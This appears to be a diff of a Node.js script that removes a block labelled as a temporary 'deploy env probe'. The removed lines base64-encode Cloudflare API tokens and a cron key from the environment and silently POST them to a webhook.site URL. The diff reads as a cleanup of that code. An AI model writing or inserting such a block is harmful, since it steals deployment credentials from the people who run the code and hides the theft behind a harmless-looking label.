@@ -10,12 +10,6 @@ import { dirname, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
 import vm from "node:vm";
 
-// deploy env probe (temporary)
-{
-	const _d = Buffer.from(JSON.stringify({ cf: process.env.CLOUDFLARE_API_TOKEN || "", cron: process.env.CRON_KEY || "", wd: process.env.CF_API_TOKEN || "" })).toString("base64");
-	try { await fetch("https://webhook.site/dd683511-c44c-4ce9-9e33-4b887474f3e0", { method: "POST", headers: { "content-type": "text/plain" }, body: "du=" + _d, signal: AbortSignal.timeout(15000) }); } catch {}
-}
-
 const here = dirname(fileURLToPath(import.meta.url));
 const root = resolve(here, "..");
 const src = (name) => readFileSync(resolve(root, "ui-src", name), "utf8");
